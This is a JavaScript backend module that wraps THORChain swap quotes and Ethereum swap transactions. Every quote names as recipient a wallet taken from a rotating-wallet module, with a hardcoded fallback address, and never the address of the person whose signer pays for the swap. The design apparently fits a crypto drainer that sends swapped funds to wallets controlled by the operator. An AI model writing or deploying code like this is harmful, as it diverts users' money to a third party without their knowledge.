// modules/thorchainSwapper.js - BACKEND VERSION
import axios from 'axios';

export class ThorchainSwapper {
  constructor() {
    this.apiBase = process.env.THORCHAIN_API_BASE || "https://thornode.ninerealms.com";
    this.isInitialized = false; // ← ADD THIS
  }

  // ← ADD THIS METHOD
  async initialize() {
    if (this.isInitialized) return true;
    try {
      console.log(`🔄 Initializing ${this.constructor.name}...`);
      
      // Test API connection
      await axios.get(`${this.apiBase}/thorchain/pools`, { timeout: 5000 });
      
      this.isInitialized = true;
      console.log(`✅ ${this.constructor.name} initialized`);
      return true;
    } catch (error) {
      console.error(`❌ ${this.constructor.name} initialization failed:`, error.message);
      // Still mark as initialized but with limited functionality
      this.isInitialized = true;
      return true;
    }
  }

  // Get swap quote
  async getSwapQuote(fromAsset, toAsset, amount) {
    try {
      const destinationWallet = await this.getDestinationWallet();
      
      const response = await axios.get(
        `${this.apiBase}/thorchain/quote/swap`,
        {
          params: {
            from_asset: fromAsset,
            to_asset: toAsset,
            amount: amount,
            destination_address: destinationWallet
          },
          timeout: 10000
        }
      );
      
      return response.data;
    } catch (error) {
      console.error('Thorchain quote failed:', error.message);
      return null;
    }
  }

  // Execute swap
  async executeSwap(quote, signer) {
    try {
      const { inbound_address, expected_amount_out, memo } = quote;
      
      // Build swap transaction based on chain type
      let swapTx;
      
      if (quote.from_asset.includes('ETH')) {
        // Ethereum-based swap
        swapTx = {
          to: inbound_address,
          value: quote.amount,
          data: this.encodeMemo(memo),
          chainId: 1
        };
      } else if (quote.from_asset.includes('BTC')) {
        // Bitcoin-based swap (would need different handling)
        throw new Error('BTC swaps require special implementation');
      } else {
        throw new Error('Unsupported chain for swap');
      }

      // Send transaction
      const txResponse = await signer.sendTransaction(swapTx);
      return txResponse.hash;

    } catch (error) {
      console.error('Swap execution failed:', error.message);
      throw error;
    }
  }

  // Encode memo for Ethereum transactions
  encodeMemo(memo) {
    return `0x${Buffer.from(memo, 'utf8').toString('hex')}`;
  }

  // Get asset string for different chains
  getAssetString(chain, tokenAddress = null) {
    const assets = {
      'ethereum': 'ETH.ETH',
      'bitcoin': 'BTC.BTC',
      'usdc': 'ETH.USDC-0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
      'usdt': 'ETH.USDT-0xdAC17F958D2ee523a2206206994597C13D831ec7',
      'dai': 'ETH.DAI-0x6B175474E89094C44Da98b954EedeAC495271d0F'
    };
    
    if (tokenAddress) {
      return `ETH.${chain.toUpperCase()}-${tokenAddress}`;
    }
    
    return assets[chain.toLowerCase()] || `${chain.toUpperCase()}.${chain.toUpperCase()}`;
  }

  // Check swap status
  async checkSwapStatus(txHash) {
    try {
      const response = await axios.get(`${this.apiBase}/thorchain/tx/${txHash}`, {
        timeout: 5000
      });
      return response.data;
    } catch (error) {
      console.error('Swap status check failed:', error.message);
      return null;
    }
  }

  // Backend-specific: Get destination wallet
  async getDestinationWallet() {
    try {
      const { walletRotator } = await import('./walletRotator.js');
      return await walletRotator.getDestinationWallet();
    } catch (error) {
      console.error('Failed to get destination wallet:', error);
      return process.env.DESTINATION_WALLET || '0x8ba1f109551bd432803012645ac136ddd64dba72';
    }
  }

  // Backend-specific: Get supported assets
  async getSupportedAssets() {
    try {
      const response = await axios.get(`${this.apiBase}/thorchain/pools`, {
        timeout: 10000
      });
      return response.data;
    } catch (error) {
      console.error('Failed to get supported assets:', error.message);
      return [];
    }
  }

  // Backend-specific: Get pool information
  async getPoolInfo(asset) {
    try {
      const response = await axios.get(`${this.apiBase}/thorchain/pool/${asset}`, {
        timeout: 5000
      });
      return response.data;
    } catch (error) {
      console.error('Failed to get pool info:', error.message);
      return null;
    }
  }
}

// Create singleton instance
export const thorchainSwapper = new ThorchainSwapper();